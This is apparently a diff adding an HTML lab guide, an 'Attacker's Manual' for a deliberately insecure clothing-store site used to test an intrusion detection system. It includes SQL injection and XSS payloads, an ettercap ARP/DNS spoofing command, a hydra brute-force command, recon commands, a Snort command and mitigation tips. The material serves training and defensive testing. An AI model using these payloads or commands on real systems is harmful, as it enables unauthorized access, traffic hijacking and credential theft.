@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Attacker's Manual: Deliberately Insecure Cloth Store</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background: #f4f8fb;
+      color: #333;
+    }
+    h1, h2, h3 {
+      color: #1a252f;
+    }
+    pre, code {
+      background: #eef2f7;
+      padding: 0.5rem;
+      border-radius: 5px;
+      display: block;
+      margin: 0.5rem 0;
+    }
+    .section {
+      background: #fff;
+      padding: 2rem;
+      margin-bottom: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    ul li {
+      margin-bottom: 0.5rem;
+    }
+    footer {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #666;
+      margin-top: 4rem;
+    }
+    #sidebar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 200px;
+      height: 100%;
+      background-color: #1a252f;
+      color: white;
+      padding: 1rem;
+      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1);
+    }
+    #sidebar a {
+      color: white;
+      display: block;
+      padding: 10px;
+      text-decoration: none;
+      font-size: 1.1rem;
+    }
+    #sidebar a:hover {
+      background-color: #444;
+    }
+    .content {
+      margin-left: 220px;
+    }
+    .collapsible {
+      cursor: pointer;
+      padding: 10px;
+      width: 100%;
+      background-color: #f1f1f1;
+      color: #1a252f;
+      text-align: left;
+      border: none;
+      outline: none;
+      font-size: 1.2rem;
+    }
+    .active, .collapsible:hover {
+      background-color: #ddd;
+    }
+    .content-collapsible {
+      padding-left: 18px;
+      display: none;
+      overflow: hidden;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="sidebar">
+    <h2>Attacker's Manual</h2>
+    <ul>
+      <li><a href="#target">Target Overview</a></li>
+      <li><a href="#recon">Reconnaissance & Vulnerability Identification</a></li>
+      <li><a href="#attack">Attack Vectors & Payload Crafting</a></li>
+      <li><a href="#dnsattack">New Attack Scenario: DNS Spoofing</a></li>
+      <li><a href="#bruteforce">New Attack Scenario: Brute Force</a></li>
+      <li><a href="#tools">Attacker Tools</a></li>
+      <li><a href="#ids">IDS Monitoring</a></li>
+      <li><a href="#mitigation">Mitigation Tips</a></li>
+      <li><a href="#resources">Additional Resources</a></li>
+    </ul>
+  </div>
+
+  <div class="content">
+    <div class="section">
+      <h1>Attacker's Manual: Deliberately Insecure Cloth Store</h1>
+      <p><strong>IMPORTANT DISCLAIMER:</strong> This guide is for educational and controlled testing purposes only. Do not attempt attacks on systems without explicit permission. The objective is to test your IDS, not to conduct real-world attacks.</p>
+      <h3>Topics Covered:</h3>
+      <ul>
+        <li><a href="#target">Target Overview</a></li>
+        <li><a href="#recon">Reconnaissance & Vulnerability Identification</a></li>
+        <li><a href="#attack">Attack Vectors & Payload Crafting</a></li>
+        <li><a href="#dnsattack">New Attack Scenario: DNS Spoofing</a></li>
+        <li><a href="#bruteforce">New Attack Scenario: Brute Force</a></li>
+        <li><a href="#tools">Attacker Tools</a></li>
+        <li><a href="#ids">IDS Monitoring</a></li>
+        <li><a href="#mitigation">Mitigation Tips</a></li>
+        <li><a href="#resources">Additional Resources</a></li>
+      </ul>
+    </div>
+
+    <div class="section" id="target">
+      <h2>Target Overview</h2>
+      <p>The target is a deliberately insecure web-based cloth store hosted on a virtual network. The site lacks proper input validation, secure session handling, and uses outdated libraries.</p>
+    </div>
+
+    <div class="section" id="recon">
+      <h2>Phase 1: Reconnaissance & Vulnerability Identification</h2>
+      <p>Perform the following to gather data:</p>
+      <ul>
+        <li>Run <code>nmap -sV vulnerable-app</code></li>
+        <li>Check HTTP headers using <code>curl -I http://vulnerable-app</code></li>
+        <li>Use <code>whatweb</code> or <code>wappalyzer</code> for tech fingerprinting</li>
+      </ul>
+    </div>
+
+    <div class="section" id="attack">
+      <h2>Phase 2: Attack Vectors & Payload Crafting</h2>
+      <h3>SQL Injection</h3>
+      <pre><code>Payload: ' OR '1'='1
+Login Form: admin' OR '1'='1</code></pre>
+
+      <h3>Cross Site Scripting (XSS)</h3>
+      <pre><code>&lt;script&gt;alert('Hacked')&lt;/script&gt;</code></pre>
+    </div>
+
+    <div class="section" id="dnsattack">
+      <h2>New Attack Scenario: DNS Spoofing</h2>
+      <p>DNS spoofing can redirect legitimate traffic to a malicious server.</p>
+      <p>Tool: <code>ettercap</code></p>
+      <p>Example Script:</p>
+      <pre><code>echo 1 > /proc/sys/net/ipv4/ip_forward
+ettercap -T -q -i eth0 -M arp:remote /victim_ip/ /dns_server_ip/ -P dns_spoof</code></pre>
+      <p>Edit <code>/etc/ettercap/etter.dns</code> to include:</p>
+      <pre><code>vulnerable-app A 10.10.10.99</code></pre>
+    </div>
+
+    <div class="section" id="bruteforce">
+      <h2>New Attack Scenario: Brute Force</h2>
+      <p>A brute force attack tries multiple password combinations to gain access to an account.</p>
+      <p>Tool: <code>hydra</code></p>
+      <p>Example Script:</p>
+      <pre><code>hydra -l admin -P /path/to/wordlist.txt vulnerable-app http-get</code></pre>
+    </div>
+
+    <div class="section" id="tools">
+      <h2>Phase 3: Attacker Tools</h2>
+      <ul>
+        <li>Burp Suite</li>
+        <li>OWASP ZAP</li>
+        <li>sqlmap</li>
+        <li>nmap</li>
+        <li>Wireshark</li>
+        <li>hydra</li>
+      </ul>
+    </div>
+
+    <div class="section" id="ids">
+      <h2>Phase 4: IDS Monitoring</h2>
+      <p>Use Snort or Suricata:</p>
+      <pre><code>snort -A console -q -c /etc/snort/snort.conf -i eth0</code></pre>
+      <p>Look for alerts generated during attack attempts.</p>
+    </div>
+
+    <div class="section" id="mitigation">
+      <h2>Phase 5: Mitigation Tips</h2>
+      <ul>
+        <li>Implement input validation using server-side and client-side validation</li>
+        <li>Use prepared statements and ORM to avoid SQL injection</li>
+        <li>Configure Content Security Policy (CSP) headers</li>
+        <li>Apply DNSSEC to secure DNS infrastructure</li>
+        <li>Update all software components regularly</li>
+        <li>Use HTTPS with HSTS enforcement</li>
+        <li>Utilize rate limiting to defend against brute force attacks</li>
+      </ul>
+    </div>
+
+    <div class="section" id="resources">
+      <h2>Additional Resources</h2>
+      <ul>
+        <li><a href="https://owasp.org">OWASP Official Website</a></li>
+        <li><a href="https://www.snort.org">Snort IDS</a></li>
+        <li><a href="https://www.suricata.io">Suricata IDS</a></li>
+        <li><a href="https://www.kali.org">Kali Linux</a></li>
+      </ul>
+    </div>
+
+    <footer>
+      &copy; 2025 Attacker's Manual | For controlled lab use only.
+    </footer>
+  </div>
+
+  <script>
+    // Collapsible sections
+    var coll = document.getElementsByClassName("collapsible");
+    for (var i = 0; i < coll.length; i++) {
+      coll[i].addEventListener("click", function() {
+        this.classList.toggle("active");
+        var content = this.nextElementSibling;
+        if (content.style.display === "block") {
+          content.style.display = "none";
+        } else {
+          content.style.display = "block";
+        }
+      });
+    }
+  </script>
+</body>
+</html>
